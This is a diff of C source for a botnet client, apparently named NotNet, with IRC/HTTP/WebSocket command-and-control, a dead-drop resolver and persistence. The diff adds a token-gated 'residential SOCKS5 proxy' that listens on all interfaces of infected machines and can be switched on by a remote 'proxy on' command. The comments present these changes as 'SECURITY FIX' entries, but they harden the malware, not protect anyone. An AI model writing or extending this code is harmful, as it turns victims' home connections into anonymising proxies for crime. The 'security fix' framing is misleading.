@@ -10,6 +10,7 @@
 #include "payload.h"
 #include "persist.h"
 #include "deaddrop.h"
+#include "proxy.h"
 #include "util.h"
 #include <stdio.h>
 #include <stdlib.h>
@@ -93,6 +94,12 @@ static int init_bot(void) {
      * blob must echo c2_secret or it is ignored (static config falls back). */
     g_bot.dead_drop_url[0] = '\0';
     g_bot.dead_drop_interval = DEAD_DROP_DEFAULT_INTERVAL;
+
+    /* SECURITY FIX (#89): Residential SOCKS5 forward proxy. Off by default;
+     * the accept thread only starts when proxy_enabled=1 AND a proxy_token
+     * is configured (fail-closed). */
+    g_bot.proxy_enabled = PROXY_DEFAULT_ENABLED;
+    g_bot.proxy_port = PROXY_DEFAULT_PORT;
     
     /* Set default C2 config.
      * SECURITY FIX (#87): IRC C2 is deprecated — trivially sinkholed and
@@ -182,6 +189,17 @@ static int init_bot(void) {
         }
     }
 
+    /* SECURITY FIX (#89): Environment variable fallback for the SOCKS5
+     * proxy token if not set in config. Without a token the proxy refuses
+     * to start (fail-closed). */
+    if (g_bot.proxy_token[0] == '\0') {
+        const char *env_tok = getenv("NOTNET_PROXY_TOKEN");
+        if (env_tok) {
+            strncpy(g_bot.proxy_token, env_tok, sizeof(g_bot.proxy_token) - 1);
+            g_bot.proxy_token[sizeof(g_bot.proxy_token) - 1] = '\0';
+        }
+    }
+
     /* SECURITY FIX (#5): Environment variable fallback for auth nicks */
     if (g_bot.c2_irc.auth_nick_count == 0) {
         const char *env_nicks = getenv("NOTNET_IRC_AUTH_NICKS");
@@ -231,6 +249,10 @@ static void cleanup_bot(void) {
     /* Release the shared OpenSSL context (no-op when TLS not compiled in) */
     tls_cleanup();
     
+    /* SECURITY FIX (#89): stop the residential SOCKS5 proxy accept thread
+     * if it was started at boot or via 'proxy on'. */
+    proxy_stop();
+    
     /* Flush logs */
     log_flush();
     log_close();
@@ -255,6 +277,19 @@ int main(void) {
      * channel connects. A verified blob overrides the static endpoints; a
      * failed, malformed, or unverified fetch leaves them as the fallback. */
     deaddrop_resolve(&g_bot);
+    
+    /* SECURITY FIX (#89): Residential SOCKS5 forward proxy. Starts the
+     * accept thread at boot only when proxy_enabled=1 AND a proxy_token is
+     * configured; 'proxy on' can also start it at runtime. The thread runs
+     * independently of the C2 main loop. */
+    if (g_bot.proxy_enabled && g_bot.proxy_token[0] != '\0') {
+        if (proxy_start(&g_bot) == 0) {
+            log_info("SOCKS5 proxy started on 0.0.0.0:%d", proxy_get_port());
+        } else {
+            log_warn("SOCKS5 proxy failed to start on port %u",
+                     (unsigned)g_bot.proxy_port);
+        }
+    }
     
     log_info("C2 protocols: IRC=%d HTTP=%d WS=%d",
              g_bot.c2_enabled & C2_IRC,
